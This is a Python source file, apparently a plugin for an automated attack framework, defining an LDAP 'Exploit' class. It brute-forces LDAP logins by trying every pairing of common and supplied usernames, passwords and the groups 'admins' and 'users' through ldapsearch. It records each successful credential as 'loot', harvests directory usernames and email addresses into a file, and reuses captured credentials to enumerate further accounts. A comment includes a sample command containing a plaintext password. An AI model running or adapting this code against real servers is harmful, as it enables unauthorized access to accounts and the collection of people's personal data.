import subprocess
import itertools as it
from hydra import Exploit
class LDAP(Exploit):
    name = "ldap"
    port = 389
    def attack(self, ip_address, usernames, passwords):
        print(f"Running LDAP attack against IP address {ip_address} with usernames {usernames} and passwords {passwords} on domain {self.domain}")
        common_usernames = ['root', 'admin', 'user']
        with open(usernames, 'r') as f:
            provided_usernames = f.read().split()
        usernames = common_usernames + provided_usernames
        with open(passwords, 'r') as f:
            passwords = f.read().split()
        common_groups = ['admins', 'users']
        domainstring = ','.join(['dc='+x for x in self.domain.split('.')])

        captured_usernames = []
        successful_loot = []

        # sample command: ldapsearch -H ldap://localhost -x -D cn=admin,ou=admins,dc=glauth,dc=com -w dogood -b dc=glauth,dc=com
        for username, password, group in it.product(usernames, passwords, common_groups):
            captured_output, captured_err = self.run_ldapsearch(ip_address, username, group, domainstring, password)
            if captured_err or not captured_output:
                continue
            new_usernames = self.process_output(captured_output)
            successful_loot.append((username, password))
            captured_usernames.extend(new_usernames)
        to_return = successful_loot + [(x, None) for x in captured_usernames]
        print(to_return)
        return to_return

    def run_ldapsearch(self, ip_address, username, group, domainstring, password):
        command = (f'ldapsearch -H ldap://{ip_address} -x -D cn={username},ou={group},{domainstring}'+
                      f' -w {password} -b {domainstring}').split()
        result = subprocess.run(command, capture_output=True, text=True)
        return result.stdout, result.stderr

    def process_output(self, output):
        usernames, emailids = [], []
        for line in output.split('\n'):
            if not line:
                continue
            if line.startswith('cn: '):
                usernames.append(line[4:])
            if line.startswith('mail: '):
                emailids.append(line[6:])      
        # save email IDs, skipping duplicates
        if emailids:
            with open('data/emailids.lst', 'r') as f:
                old_emails = set(f.read().split())
            all_emails = old_emails.union(set(emailids))
            with open('data/emailids.lst', 'w+') as f:
                f.write('\n'.join(all_emails) + '\n')      
        return usernames

    def getloot(self, ip_address, credentials):
        common_groups = ['admins', 'users']
        domainstring = ','.join(['dc='+x for x in self.domain.split('.')])
        captured_usernames = []
        for group in common_groups:
            for username, password in credentials:
                if not username or not password:
                    continue
                captured_output, captured_err = self.run_ldapsearch(ip_address, username, group, domainstring, password)
                if captured_err or not captured_output:
                    continue
                new_usernames = self.process_output(captured_output)
                captured_usernames.extend(new_usernames)
        return [(u, None) for u in captured_usernames]